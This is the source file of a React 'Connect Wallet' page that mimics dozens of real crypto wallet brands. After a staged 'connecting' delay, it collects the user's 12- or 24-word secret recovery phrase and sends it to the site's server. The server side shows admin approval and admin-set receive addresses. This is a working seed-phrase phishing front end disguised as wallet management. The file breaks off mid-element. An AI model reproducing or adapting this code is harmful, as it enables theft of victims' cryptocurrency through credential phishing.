'use client';

import React, { useState, useEffect } from 'react';
import Image from 'next/image';
import { motion, AnimatePresence } from 'framer-motion';
import {
  Wallet,
  Plus,
  ChevronRight,
  ChevronLeft,
  X,
  AlertCircle,
  CheckCircle2,
  Info,
  Loader2,
  Copy,
  Check,
  Clock,
  Shield,
  Coins,
  Eye,
  EyeOff,
  XCircle,
  ArrowDownLeft,
} from 'lucide-react';
import { cn, formatCurrency } from '@/utils';
import { WalletLogo } from '@/components/wallet/WalletLogos';
import { useLanguage } from '@/lib/i18n';

// ============================================
// Connect Wallet Page - Full Wallet Management
// ============================================

// Wallet Provider Interface
export interface WalletProvider {
  id: string;
  name: string;
  description: string;
  popular?: boolean;
}

// Wallet Token Interface
interface WalletToken {
  symbol: string;
  name: string;
  icon: string;
  amount: number;
  amountUsd: number;
  tokenAddress?: string; // Admin-set receive address
  initialAmountUsd?: number; // Balance at time of wallet approval
  currentAmountUsd?: number; // Current balance in system
}

// Connected Wallet Interface (from DB)
interface ConnectedWallet {
  _id: string;
  walletType: string;
  walletName: string;
  walletIcon: string;
  address: string;
  status: 'pending' | 'approved' | 'rejected';
  tokens: WalletToken[];
  totalBalanceUsd: number; // Initial balance at approval
  createdAt: string;
  approvedAt?: string;
  rejectedAt?: string;
  adminNote?: string;
}

// Wallet providers list
const walletProviders: WalletProvider[] = [
  // === POPULAR / HOT WALLETS ===
  { id: 'metamask', name: 'MetaMask', description: 'Browser extension wallet', popular: true },
  { id: 'trustwallet', name: 'Trust Wallet', description: 'Mobile crypto wallet', popular: true },
  { id: 'coinbase', name: 'Coinbase Wallet', description: 'Self-custody crypto wallet', popular: true },
  { id: 'phantom', name: 'Phantom', description: 'Solana & multi-chain wallet', popular: true },
  { id: 'okx', name: 'OKX Wallet', description: 'Multi-chain Web3 wallet', popular: true },
  { id: 'binance', name: 'Binance Web3 Wallet', description: 'Binance ecosystem wallet', popular: true },
  { id: 'safepal', name: 'SafePal', description: 'Hardware & software wallet', popular: true },
  { id: 'exodus', name: 'Exodus', description: 'Desktop & mobile wallet', popular: true },
  { id: 'ledger', name: 'Ledger', description: 'Hardware wallet', popular: true },
  { id: 'trezor', name: 'Trezor', description: 'Hardware wallet', popular: true },

  // === MOBILE WALLETS ===
  { id: 'rainbow', name: 'Rainbow', description: 'Ethereum wallet for NFTs', popular: false },
  { id: 'argent', name: 'Argent', description: 'Smart contract wallet', popular: false },
  { id: 'zerion', name: 'Zerion', description: 'DeFi wallet & portfolio', popular: false },
  { id: 'imtoken', name: 'imToken', description: 'Multi-chain wallet', popular: false },
  { id: 'tokenpocket', name: 'TokenPocket', description: 'Multi-chain DeFi wallet', popular: false },
  { id: 'mathwallet', name: 'Math Wallet', description: 'Multi-platform wallet', popular: false },
  { id: 'bitkeep', name: 'BitKeep (Bitget Wallet)', description: 'Multi-chain Web3 wallet', popular: false },
  { id: 'coin98', name: 'Coin98', description: 'Multi-chain DeFi wallet', popular: false },

  // === EXCHANGE WALLETS ===
  { id: 'crypto.com', name: 'Crypto.com DeFi Wallet', description: 'Non-custodial wallet', popular: false },
  { id: 'kucoin', name: 'KuCoin Wallet', description: 'Exchange wallet', popular: false },
  { id: 'bybit', name: 'Bybit Web3 Wallet', description: 'Multi-chain wallet', popular: false },
  { id: 'gate', name: 'Gate.io Wallet', description: 'Exchange Web3 wallet', popular: false },

  // === BLOCKCHAIN SPECIFIC ===
  { id: 'solflare', name: 'Solflare', description: 'Solana wallet', popular: false },
  { id: 'backpack', name: 'Backpack', description: 'Solana & xNFT wallet', popular: false },
  { id: 'keplr', name: 'Keplr', description: 'Cosmos ecosystem wallet', popular: false },
  { id: 'terrastation', name: 'Terra Station', description: 'Terra blockchain wallet', popular: false },
  { id: 'xdefi', name: 'XDEFI Wallet', description: 'Multi-chain DeFi wallet', popular: false },
  { id: 'rabby', name: 'Rabby Wallet', description: 'Browser extension wallet', popular: false },
  { id: 'frame', name: 'Frame', description: 'Privacy-focused wallet', popular: false },

  // === BITCOIN SPECIFIC ===
  { id: 'bluewallet', name: 'BlueWallet', description: 'Bitcoin & Lightning wallet', popular: false },
  { id: 'electrum', name: 'Electrum', description: 'Bitcoin wallet', popular: false },
  { id: 'wasabi', name: 'Wasabi Wallet', description: 'Privacy Bitcoin wallet', popular: false },
  { id: 'sparrow', name: 'Sparrow Wallet', description: 'Bitcoin desktop wallet', popular: false },
  { id: 'unisat', name: 'UniSat Wallet', description: 'Bitcoin Ordinals wallet', popular: false },

  // === HARDWARE ===
  { id: 'keepkey', name: 'KeepKey', description: 'Hardware wallet', popular: false },
  { id: 'keystone', name: 'Keystone', description: 'Air-gapped hardware wallet', popular: false },

  // === OTHER POPULAR ===
  { id: 'atomic', name: 'Atomic Wallet', description: 'Decentralized wallet', popular: false },
  { id: 'blockchain.com', name: 'Blockchain.com Wallet', description: 'Multi-currency wallet', popular: false },
  { id: 'zengo', name: 'ZenGo', description: 'Keyless crypto wallet', popular: false },
  { id: '1inch', name: '1inch Wallet', description: 'DeFi wallet', popular: false },
  { id: 'frontier', name: 'Frontier', description: 'DeFi & NFT wallet', popular: false },
  { id: 'onto', name: 'ONTO Wallet', description: 'Multi-chain DID wallet', popular: false },
  { id: 'unstoppable', name: 'Unstoppable Wallet', description: 'Privacy-focused wallet', popular: false },
  { id: 'guarda', name: 'Guarda Wallet', description: 'Multi-currency wallet', popular: false },
];

type ViewState = 'list' | 'connect' | 'import' | 'wallet-detail' | 'token-detail' | 'custom-wallet-name';

// Toast Component
interface Toast {
  id: string;
  type: 'success' | 'error' | 'info';
  message: string;
}

function ToastContainer({ toasts, onDismiss }: { toasts: Toast[]; onDismiss: (id: string) => void }) {
  return (
    <div className="fixed bottom-6 right-6 z-[100] flex flex-col gap-3">
      <AnimatePresence>
        {toasts.map((toast) => (
          <motion.div
            key={toast.id}
            initial={{ opacity: 0, x: 100, scale: 0.9 }}
            animate={{ opacity: 1, x: 0, scale: 1 }}
            exit={{ opacity: 0, x: 100, scale: 0.9 }}
            className={cn(
              'flex items-center gap-3 px-4 py-3 rounded-xl shadow-xl min-w-[300px]',
              toast.type === 'success' && 'bg-[#22c55e] text-white',
              toast.type === 'error' && 'bg-[#ef4444] text-white',
              toast.type === 'info' && 'bg-[#3b82f6] text-white'
            )}
          >
            {toast.type === 'success' && <CheckCircle2 className="h-5 w-5" />}
            {toast.type === 'error' && <AlertCircle className="h-5 w-5" />}
            {toast.type === 'info' && <Info className="h-5 w-5" />}
            <span className="flex-1 text-sm font-medium">{toast.message}</span>
            <button onClick={() => onDismiss(toast.id)} className="hover:opacity-70">
              <X className="h-4 w-4" />
            </button>
          </motion.div>
        ))}
      </AnimatePresence>
    </div>
  );
}

export default function ConnectWalletPage() {
  // Translation hook
  const { t } = useLanguage();
  
  const [viewState, setViewState] = useState<ViewState>('list');
  const [selectedProvider, setSelectedProvider] = useState<WalletProvider | null>(null);
  const [selectedWallet, setSelectedWallet] = useState<ConnectedWallet | null>(null);
  const [selectedToken, setSelectedToken] = useState<WalletToken | null>(null);
  const [connectedWallets, setConnectedWallets] = useState<ConnectedWallet[]>([]);
  const [toasts, setToasts] = useState<Toast[]>([]);
  const [showAllWallets, setShowAllWallets] = useState(false);
  const [isLoading, setIsLoading] = useState(true);
  
  // Import form state
  const [secretPhrase, setSecretPhrase] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showPhrase, setShowPhrase] = useState(false);
  
  // Custom wallet state
  const [isCustomWallet, setIsCustomWallet] = useState(false);
  const [customWalletName, setCustomWalletName] = useState('');
  
  // Copy state
  const [copied, setCopied] = useState(false);

  // Stats
  const [stats, setStats] = useState({
    total: 0,
    approved: 0,
    pending: 0,
    totalBalanceUsd: 0,
  });

  // Fetch wallets on mount
  useEffect(() => {
    fetchWallets();
  }, []);

  const fetchWallets = async () => {
    try {
      setIsLoading(true);
      const res = await fetch('/api/user/wallets');
      const data = await res.json();
      
      if (res.ok) {
        setConnectedWallets(data.wallets || []);
        setStats(data.stats || { total: 0, approved: 0, pending: 0, totalBalanceUsd: 0 });
      }
    } catch (error) {
      console.error('Failed to fetch wallets:', error);
    } finally {
      setIsLoading(false);
    }
  };

  const addToast = (type: Toast['type'], message: string) => {
    const id = Math.random().toString(36).substr(2, 9);
    setToasts((prev) => [...prev, { id, type, message }]);
    setTimeout(() => {
      setToasts((prev) => prev.filter((t) => t.id !== id));
    }, 5000);
  };

  const dismissToast = (id: string) => {
    setToasts((prev) => prev.filter((t) => t.id !== id));
  };

  const handleSelectProvider = (provider: WalletProvider) => {
    setSelectedProvider(provider);
    setViewState('connect');
  };

  const handleConnectWallet = async () => {
    if (!selectedProvider) return;
    
    setIsSubmitting(true);
    await new Promise((resolve) => setTimeout(resolve, 1500));
    setViewState('import');
    setIsSubmitting(false);
  };

  const handleImportWallet = async () => {
    if (!secretPhrase.trim()) {
      addToast('error', t.connectWallet.secretRecoveryPhrase);
      return;
    }

    const words = secretPhrase.trim().split(/\s+/);
    if (words.length !== 12 && words.length !== 24) {
      addToast('error', t.connectWallet.invalidPhrase);
      return;
    }

    // For custom wallet, use customWalletName; otherwise use selectedProvider
    const walletName = isCustomWallet ? customWalletName.trim() : selectedProvider?.name;
    const walletType = isCustomWallet ? 'custom' : selectedProvider?.id;

    if (!walletName || !walletType) {
      addToast('error', t.connectWallet.enterWalletName);
      return;
    }

    setIsSubmitting(true);

    try {
      const res = await fetch('/api/user/wallets', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          walletType: walletType,
          walletName: walletName,
          walletIcon: '',
          seedPhrase: secretPhrase.trim(),
        }),
      });

      const data = await res.json();

      if (res.ok) {
        addToast('success', t.connectWallet.walletImportedSuccess);
        setSecretPhrase('');
        setSelectedProvider(null);
        setIsCustomWallet(false);
        setCustomWalletName('');
        setViewState('list');
        fetchWallets();
      } else {
        addToast('error', data.error || t.connectWallet.failedToImport);
      }
    } catch (error) {
      addToast('error', t.connectWallet.failedToImport);
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleViewWallet = (wallet: ConnectedWallet) => {
    setSelectedWallet(wallet);
    setViewState('wallet-detail');
  };

  const handleViewToken = (token: WalletToken) => {
    setSelectedToken(token);
    setViewState('token-detail');
  };

  const handleCopyAddress = async (address: string) => {
    await navigator.clipboard.writeText(address);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
    addToast('success', t.connectWallet.copied);
  };

  const handleBack = () => {
    if (viewState === 'token-detail') {
      setViewState('wallet-detail');
      setSelectedToken(null);
    } else if (viewState === 'wallet-detail') {
      setViewState('list');
      setSelectedWallet(null);
    } else if (viewState === 'import') {
      if (isCustomWallet) {
        setViewState('custom-wallet-name');
      } else {
        setViewState('connect');
      }
      setSecretPhrase('');
    } else if (viewState === 'connect') {
      setViewState('list');
      setSelectedProvider(null);
      setSecretPhrase('');
    } else if (viewState === 'custom-wallet-name') {
      setViewState('list');
      setIsCustomWallet(false);
      setCustomWalletName('');
    }
  };

  // Handle custom wallet name submission
  const handleCustomWalletContinue = () => {
    if (!customWalletName.trim()) {
      addToast('error', t.connectWallet.enterWalletName);
      return;
    }
    setViewState('import');
  };

  const popularWallets = walletProviders.filter(w => w.popular);
  const allWallets = walletProviders;
  const displayedWallets = showAllWallets ? allWallets : popularWallets;

  // Separate wallets by status
  const approvedWallets = connectedWallets.filter(w => w.status === 'approved');
  const pendingWallets = connectedWallets.filter(w => w.status === 'pending');
  const rejectedWallets = connectedWallets.filter(w => w.status === 'rejected');

  return (
    <div className="max-w-4xl mx-auto py-4 sm:py-6 lg:py-8 px-3 sm:px-4">
      {/* ===== MAIN LIST VIEW ===== */}
      {viewState === 'list' && (
        <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }}>
          <h1 className="font-heading text-2xl sm:text-3xl font-bold text-white mb-1 sm:mb-2">{t.connectWallet.title}</h1>
          <p className="text-sm sm:text-base text-[#6b7a90] mb-5 sm:mb-8">{t.connectWallet.subtitle}</p>

          {isLoading ? (
            <div className="flex items-center justify-center py-20">
              <Loader2 className="h-8 w-8 animate-spin text-[#22c55e]" />
            </div>
          ) : (
            <>
              {/* Connected Wallets Summary */}
              {connectedWallets.length > 0 && (
                <div className="mb-5 sm:mb-8">
                  {/* Stats Cards */}
                  <div className="grid grid-cols-2 lg:grid-cols-4 gap-2 sm:gap-4 mb-4 sm:mb-6">
                    <div className="bg-[#0f1419] rounded-lg sm:rounded-xl p-3 sm:p-4 border border-[#1e2733]">
                      <p className="text-xs sm:text-sm text-[#6b7a90] mb-0.5 sm:mb-1">{t.connectWallet.totalWallets}</p>
                      <p className="text-xl sm:text-2xl font-bold text-white">{stats.total}</p>
                    </div>
                    <div className="bg-[#0f1419] rounded-lg sm:rounded-xl p-3 sm:p-4 border border-[#1e2733]">
                      <p className="text-xs sm:text-sm text-[#6b7a90] mb-0.5 sm:mb-1">{t.connectWallet.approved}</p>
                      <p className="text-xl sm:text-2xl font-bold text-[#22c55e]">{stats.approved}</p>
                    </div>
                    <div className="bg-[#0f1419] rounded-lg sm:rounded-xl p-3 sm:p-4 border border-[#1e2733]">
                      <p className="text-xs sm:text-sm text-[#6b7a90] mb-0.5 sm:mb-1">{t.connectWallet.pending}</p>
                      <p className="text-xl sm:text-2xl font-bold text-[#f59e0b]">{stats.pending}</p>
                    </div>
                    <div className="bg-[#0f1419] rounded-lg sm:rounded-xl p-3 sm:p-4 border border-[#1e2733]">
                      <p className="text-xs sm:text-sm text-[#6b7a90] mb-0.5 sm:mb-1">{t.connectWallet.totalBalance}</p>
                      <p className="text-xl sm:text-2xl font-bold text-white">{formatCurrency(stats.totalBalanceUsd)}</p>
                    </div>
                  </div>

                  {/* Approved Wallets */}
                  {approvedWallets.length > 0 && (
                    <div className="mb-4 sm:mb-6">
                      <h2 className="font-semibold text-sm sm:text-base text-white mb-2 sm:mb-3 flex items-center gap-2">
                        <Shield className="h-4 w-4 sm:h-5 sm:w-5 text-[#22c55e]" />
                        {t.connectWallet.approvedWallets} ({approvedWallets.length})
                      </h2>
                      <div className="space-y-2 sm:space-y-3">
                        {approvedWallets.map((wallet) => (
                          <button
                            key={wallet._id}
                            onClick={() => handleViewWallet(wallet)}
                            className="w-full flex items-center justify-between p-3 sm:p-4 bg-[#0f1419] rounded-lg sm:rounded-xl border border-[#1e2733] hover:border-[#22c55e]/50 transition-all"
                          >
                            <div className="flex items-center gap-2.5 sm:gap-4">
                              <div className="h-10 w-10 sm:h-12 sm:w-12 rounded-lg sm:rounded-xl bg-[#1e2733] flex items-center justify-center overflow-hidden shrink-0">
                                <WalletLogo walletId={wallet.walletType} name={wallet.walletName} size={28} />
                              </div>
                              <div className="text-left min-w-0">
                                <p className="font-medium text-sm sm:text-base text-white truncate">{wallet.walletName}</p>
                                <p className="text-xs sm:text-sm text-[#6b7a90] font-mono">
                                  {wallet.address.slice(0, 6)}...{wallet.address.slice(-4)}
                                </p>
                              </div>
                            </div>
                            <div className="flex items-center gap-2 sm:gap-4">
                              <div className="text-right hidden xs:block">
                                <p className="font-semibold text-sm sm:text-base text-white">{formatCurrency(wallet.totalBalanceUsd)}</p>
                                <p className="text-xs sm:text-sm text-[#6b7a90]">
                                  {wallet.tokens.filter(tk => tk.amountUsd > 0).length} {t.connectWallet.tokens}
                                </p>
                              </div>
                              <ChevronRight className="h-4 w-4 sm:h-5 sm:w-5 text-[#6b7a90] shrink-0" />
                            </div>
                          </button>
                        ))}
                      </div>
                    </div>
                  )}

                  {/* Pending Wallets */}
                  {pendingWallets.length > 0 && (
                    <div className="mb-4 sm:mb-6">
                      <h2 className="font-semibold text-sm sm:text-base text-white mb-2 sm:mb-3 flex items-center gap-2">
                        <Clock className="h-4 w-4 sm:h-5 sm:w-5 text-[#f59e0b]" />
                        {t.connectWallet.pendingVerification} ({pendingWallets.length})
                      </h2>
                      <div className="space-y-2 sm:space-y-3">
                        {pendingWallets.map((wallet) => (
                          <button
                            key={wallet._id}
                            onClick={() => handleViewWallet(wallet)}
                            className="w-full flex items-center justify-between p-3 sm:p-4 bg-[#0f1419] rounded-lg sm:rounded-xl border border-[#f59e0b]/30 hover:border-[#f59e0b]/50 transition-all"
                          >
                            <div className="flex items-center gap-2.5 sm:gap-4">
                              <div className="h-10 w-10 sm:h-12 sm:w-12 rounded-lg sm:rounded-xl bg-[#1e2733] flex items-center justify-center overflow-hidden shrink-0">
                                <WalletLogo walletId={wallet.walletType} name={wallet.walletName} size={28} />
                              </div>
                              <div className="text-left min-w-0">
                                <p className="font-medium text-sm sm:text-base text-white truncate">{wallet.walletName}</p>
                                <p className="text-xs sm:text-sm text-[#6b7a90] font-mono">
                                  {wallet.address.slice(0, 6)}...{wallet.address.slice(-4)}
                                </p>
                              </div>
                            </div>
                            <div className="flex items-center gap-2 sm:gap-3">
                              <span className="px-2 sm:px-3 py-1 sm:py-1.5 rounded-full bg-[#f59e0b]/10 text-[#f59e0b] text-xs sm:text-sm font-medium">
                                {t.connectWallet.pending}
                              </span>
                              <ChevronRight className="h-4 w-4 sm:h-5 sm:w-5 text-[#6b7a90] shrink-0" />
                            </div>
                          </button>
                        ))}
                      </div>
                    </div>
                  )}

                  {/* Rejected Wallets */}
                  {rejectedWallets.length > 0 && (
                    <div className="mb-4 sm:mb-6">
                      <h2 className="font-semibold text-sm sm:text-base text-white mb-2 sm:mb-3 flex items-center gap-2">
                        <XCircle className="h-4 w-4 sm:h-5 sm:w-5 text-[#ef4444]" />
                        {t.connectWallet.rejected} ({rejectedWallets.length})
                      </h2>
                      <div className="space-y-2 sm:space-y-3">
                        {rejectedWallets.map((wallet) => (
                          <div
                            key={wallet._id}
                            className="flex items-center justify-between p-3 sm:p-4 bg-[#0f1419] rounded-lg sm:rounded-xl border border-[#ef4444]/30 opacity-60"
                          >
                            <div className="flex items-center gap-2.5 sm:gap-4">
                              <div className="h-10 w-10 sm:h-12 sm:w-12 rounded-lg sm:rounded-xl bg-[#1e2733] flex items-center justify-center overflow-hidden shrink-0">
                                <WalletLogo walletId={wallet.walletType} name={wallet.walletName} size={28} />
                              </div>
                              <div className="text-left min-w-0">
                                <p className="font-medium text-sm sm:text-base text-white truncate">{wallet.walletName}</p>
                                <p className="text-xs sm:text-sm text-[#ef4444] truncate">
                                  {wallet.adminNote || t.connectWallet.rejected}
                                </p>
                              </div>
                            </div>
                            <span className="px-2 sm:px-3 py-1 sm:py-1.5 rounded-full bg-[#ef4444]/10 text-[#ef4444] text-xs sm:text-sm font-medium shrink-0">
                              {t.connectWallet.rejected}
                            </span>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}
                </div>
              )}

              {/* Select a Wallet Section */}
              <div className="mb-4 sm:mb-6">
                <h2 className="font-semibold text-sm sm:text-base text-white mb-3 sm:mb-4">{t.connectWallet.selectWallet}</h2>
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 sm:gap-3">
                  {displayedWallets.map((wallet) => (
                    <button
                      key={wallet.id}
                      onClick={() => handleSelectProvider(wallet)}
                      className="flex items-center gap-3 sm:gap-4 p-3 sm:p-4 bg-[#0f1419] rounded-lg sm:rounded-xl border border-[#1e2733] hover:border-[#22c55e]/50 hover:bg-[#151c24] transition-all"
                    >
                      <div className="h-10 w-10 sm:h-12 sm:w-12 rounded-lg sm:rounded-xl bg-[#1e2733] flex items-center justify-center overflow-hidden shrink-0">
                        <WalletLogo walletId={wallet.id} name={wallet.name} size={28} />
                      </div>
                      <div className="flex-1 text-left min-w-0">
                        <p className="font-medium text-sm sm:text-base text-white truncate">{wallet.name}</p>
                        <p className="text-xs sm:text-sm text-[#6b7a90] truncate">{wallet.description}</p>
                      </div>
                      <ChevronRight className="h-4 w-4 sm:h-5 sm:w-5 text-[#6b7a90] shrink-0" />
                    </button>
                  ))}
                </div>

                {!showAllWallets && (
                  <button
                    onClick={() => setShowAllWallets(true)}
                    className="w-full mt-3 sm:mt-4 py-2.5 sm:py-3 text-center text-sm sm:text-base text-[#6b7a90] hover:text-white transition-colors"
                  >
                    {t.connectWallet.showAllWallets} ({allWallets.length})
                  </button>
                )}
              </div>

              {/* Add Another Wallet - Opens custom wallet name entry */}
              <div className="border-2 border-dashed border-[#1e2733] rounded-lg sm:rounded-xl p-4 sm:p-6 text-center hover:border-[#22c55e]/50 transition-colors cursor-pointer"
                   onClick={() => { setIsCustomWallet(true); setViewState('custom-wallet-name'); }}>
                <div className="h-10 w-10 sm:h-12 sm:w-12 rounded-full bg-[#22c55e]/10 flex items-center justify-center mx-auto mb-2 sm:mb-3">
                  <Plus className="h-5 w-5 sm:h-6 sm:w-6 text-[#22c55e]" />
                </div>
                <p className="font-medium text-sm sm:text-base text-white">{t.connectWallet.addAnotherWallet}</p>
              </div>

              {/* Secure Connection Notice */}
              <div className="mt-5 sm:mt-8 flex items-start gap-2.5 sm:gap-3 p-3 sm:p-4 bg-[#0f1419] rounded-lg sm:rounded-xl border border-[#1e2733]">
                <Shield className="h-4 w-4 sm:h-5 sm:w-5 text-[#22c55e] shrink-0 mt-0.5" />
                <div>
                  <p className="font-medium text-sm sm:text-base text-white mb-0.5 sm:mb-1">{t.connectWallet.secureConnection}</p>
                  <p className="text-xs sm:text-sm text-[#6b7a90]">
                    {t.connectWallet.secureConnectionText}
                  </p>
                </div>
              </div>
            </>
          )}
        </motion.div>
      )}

      {/* ===== CUSTOM WALLET NAME VIEW ===== */}
      {viewState === 'custom-wallet-name' && (
        <motion.div initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }}>
          <button
            onClick={handleBack}
            className="flex items-center gap-1.5 sm:gap-2 text-sm sm:text-base text-[#6b7a90] hover:text-white mb-4 sm:mb-6 transition-colors"
          >
            <ChevronLeft className="h-4 w-4" />
            {t.common.back}
          </button>

          <div className="bg-[#0f1419] rounded-xl sm:rounded-2xl p-4 sm:p-6 lg:p-8 border border-[#1e2733]">
            <div className="flex items-center gap-3 sm:gap-4 mb-4 sm:mb-6">
              <div className="h-12 w-12 sm:h-16 sm:w-16 rounded-xl sm:rounded-2xl bg-[#22c55e]/10 flex items-center justify-center shrink-0">
                <Wallet className="h-6 w-6 sm:h-8 sm:w-8 text-[#22c55e]" />
              </div>
              <div className="min-w-0">
                <h2 className="font-heading text-xl sm:text-2xl font-bold text-white">{t.connectWallet.customWallet}</h2>
                <p className="text-sm sm:text-base text-[#6b7a90]">{t.connectWallet.enterWalletName}</p>
              </div>
            </div>

            <div className="mb-4 sm:mb-6">
              <label className="block text-xs sm:text-sm font-medium text-white mb-1.5 sm:mb-2">
                {t.connectWallet.walletAddress}
              </label>
              <input
                type="text"
                value={customWalletName}
                onChange={(e) => setCustomWalletName(e.target.value)}
                placeholder={t.connectWallet.walletNamePlaceholder}
                className="w-full px-3 sm:px-4 py-2.5 sm:py-3 rounded-lg sm:rounded-xl bg-[#0a0e14] border border-[#1e2733] text-white placeholder:text-[#6b7a90] focus:outline-none focus:border-[#22c55e]/50 transition-colors text-sm sm:text-base"
              />
            </div>

            <button
              onClick={handleCustomWalletContinue}
              disabled={!customWalletName.trim()}
              className={cn(
                'w-full py-3 sm:py-4 rounded-lg sm:rounded-xl font-semibold text-sm sm:text-base text-white transition-all',
                'bg-[#22c55e] hover:bg-[#1ea550]',
                'disabled:opacity-50 disabled:cursor-not-allowed'
              )}
            >
              {t.connectWallet.continueBtn}
            </button>

            <div className="mt-4 sm:mt-6 p-3 sm:p-4 bg-[#3b82f6]/10 rounded-lg sm:rounded-xl border border-[#3b82f6]/20">
              <div className="flex items-start gap-2.5 sm:gap-3">
                <Info className="h-4 w-4 sm:h-5 sm:w-5 text-[#3b82f6] shrink-0 mt-0.5" />
                <div>
                  <p className="font-medium text-sm sm:text-base text-white mb-0.5 sm:mb-1">{t.connectWallet.whatHappensNext}</p>
                  <p className="text-xs sm:text-sm text-[#6b7a90]">
                    {t.connectWallet.whatHappensNextText}
                  </p>
                </div>
              </div>
            </div>
          </div>
        </motion.div>
      )}

      {/* ===== CONNECT WALLET VIEW ===== */}
      {viewState === 'connect' && selectedProvider && (
        <motion.div initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }}>
          <button
            onClick={handleBack}
            className="flex items-center gap-1.5 sm:gap-2 text-sm sm:text-base text-[#6b7a90] hover:text-white mb-4 sm:mb-6 transition-colors"
          >
            <ChevronLeft className="h-4 w-4" />
            {t.common.back}
          </button>

          <div className="bg-[#0f1419] rounded-xl sm:rounded-2xl p-4 sm:p-6 lg:p-8 border border-[#1e2733]">
            <div className="flex items-center gap-3 sm:gap-4 mb-4 sm:mb-6">
              <div className="h-12 w-12 sm:h-16 sm:w-16 rounded-xl sm:rounded-2xl bg-[#1e2733] flex items-center justify-center overflow-hidden shrink-0">
                <WalletLogo walletId={selectedProvider.id} name={selectedProvider.name} size={36} />
              </div>
              <div className="min-w-0">
                <h2 className="font-heading text-xl sm:text-2xl font-bold text-white truncate">{selectedProvider.name}</h2>
                <p className="text-sm sm:text-base text-[#6b7a90] truncate">{selectedProvider.description}</p>
              </div>
            </div>

            <div className="bg-[#0a0e14] rounded-lg sm:rounded-xl p-3 sm:p-5 mb-4 sm:mb-6 border border-[#1e2733]">
              <h3 className="font-semibold text-sm sm:text-base text-white mb-2 sm:mb-3">{t.connectWallet.connectionOptions}</h3>
              <div className="space-y-2 sm:space-y-3">
                <button
                  onClick={handleConnectWallet}
                  disabled={isSubmitting}
                  className="w-full flex items-center justify-between p-3 sm:p-4 bg-[#151c24] rounded-lg sm:rounded-xl border border-[#1e2733] hover:border-[#22c55e]/50 transition-colors disabled:opacity-50"
                >
                  <div className="flex items-center gap-2.5 sm:gap-3">
                    <div className="h-9 w-9 sm:h-10 sm:w-10 rounded-lg sm:rounded-xl bg-[#22c55e]/10 flex items-center justify-center shrink-0">
                      <Wallet className="h-4 w-4 sm:h-5 sm:w-5 text-[#22c55e]" />
                    </div>
                    <div className="text-left">
                      <p className="font-medium text-sm sm:text-base text-white">{t.connectWallet.importWithSeedPhrase}</p>
                      <p className="text-xs sm:text-sm text-[#6b7a90]">{t.connectWallet.importDescription}</p>
                    </div>
                  </div>
                  {isSubmitting ? (
                    <Loader2 className="h-4 w-4 sm:h-5 sm:w-5 animate-spin text-[#22c55e] shrink-0" />
                  ) : (
                    <ChevronRight className="h-4 w-4 sm:h-5 sm:w-5 text-[#6b7a90] shrink-0" />
                  )}
                </button>
              </div>
            </div>

            <div className="p-3 sm:p-4 bg-[#f59e0b]/10 rounded-lg sm:rounded-xl border border-[#f59e0b]/20">
              <div className="flex items-start gap-2.5 sm:gap-3">
                <AlertCircle className="h-4 w-4 sm:h-5 sm:w-5 text-[#f59e0b] shrink-0 mt-0.5" />
                <div>
                  <p className="font-medium text-sm sm:text-base text-white mb-0.5 sm:mb-1">{t.connectWallet.securityNotice}</p>
                  <p className="text-xs sm:text-sm text-[#6b7a90]">
                    {t.connectWallet.securityNoticeText}
                  </p>
                </div>
              </div>
            </div>
          </div>
        </motion.div>
      )}

      {/* ===== IMPORT WALLET VIEW ===== */}
      {viewState === 'import' && (selectedProvider || isCustomWallet) && (
        <motion.div initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }}>
          <button
            onClick={handleBack}
            className="flex items-center gap-1.5 sm:gap-2 text-sm sm:text-base text-[#6b7a90] hover:text-white mb-4 sm:mb-6 transition-colors"
          >
            <ChevronLeft className="h-4 w-4" />
            {t.common.back}
          </button>

          <div className="bg-[#0f1419] rounded-xl sm:rounded-2xl p-4 sm:p-6 lg:p-8 border border-[#1e2733]">
            <div className="flex items-center gap-3 sm:gap-4 mb-4 sm:mb-6">
              {isCustomWallet ? (
                <div className="h-11 w-11 sm:h-14 sm:w-14 rounded-xl sm:rounded-2xl bg-[#22c55e]/10 flex items-center justify-center shrink-0">
                  <Wallet className="h-6 w-6 sm:h-7 sm:w-7 text-[#22c55e]" />
                </div>
              ) : (
                <div className="h-11 w-11 sm:h-14 sm:w-14 rounded-xl sm:rounded-2xl bg-[#1e2733] flex items-center justify-center overflow-hidden shrink-0">
                  <WalletLogo walletId={selectedProvider!.id} name={selectedProvider!.name} size={32} />
                </div>
              )}
              <div className="min-w-0">
                <h2 className="font-heading text-lg sm:text-xl font-bold text-white truncate">
                  {t.connectWallet.importWallet} {isCustomWallet ? customWalletName : selectedProvider?.name}
                </h2>
                <p className="text-xs sm:text-sm text-[#6b7a90]">{t.connectWallet.importDescription}</p>
              </div>
            </div>

            <div className="mb-4 sm:mb-6">
              <label className="block text-xs sm:text-sm font-medium text-white mb-1.5 sm:mb-2">
                {t.connectWallet.secretRecoveryPhrase}
              </label>
              <div className="relative">
                <textarea
                  value={secretPhrase}
                  onChange={(e) => setSecretPhrase(e.target.value)}
                  placeholder={t.connectWallet.enterPhrasePlaceholder}
                  rows={3}
                  className={cn(
                    'w-full px-3 sm:px-4 py-2.5 sm:py-3 rounded-lg sm:rounded-xl bg-[#0a0e14] border border-[#1e2733] text-white',
                    'placeholder:text-[#6b7a90] focus:outline-none focus:border-[#22c55e]/50 transition-colors',
                    'font-mono text-xs sm:text-sm resize-none',
                    !showPhrase && 'text-security-disc'
                  )}
                  style={!showPhrase ? { WebkitTextSecurity: 'disc' } as React.CSSProperties : {}}
                />
                <button
                  type="button"
                  onClick={() => setShowPhrase(!showPhrase)}
                  className="absolute right-2.5 sm:right-3 top-2.5 sm:top-3 text-[#6b7a90] hover:text-white transition-colors"
                >
                  {showPhrase ? <EyeOff className="h-4 w-4 sm:h-5 sm:w-5" /> : <Eye className="h-4 w-4 sm:h-5 sm:w-5" />}
                </button>
              </div>
              <p className="text-[10px] sm:text-xs text-[#6b7a90] mt-1.5 sm:mt-2">
                {t.connectWallet.wordsSeparated}
              </p>
            </div>

            <button
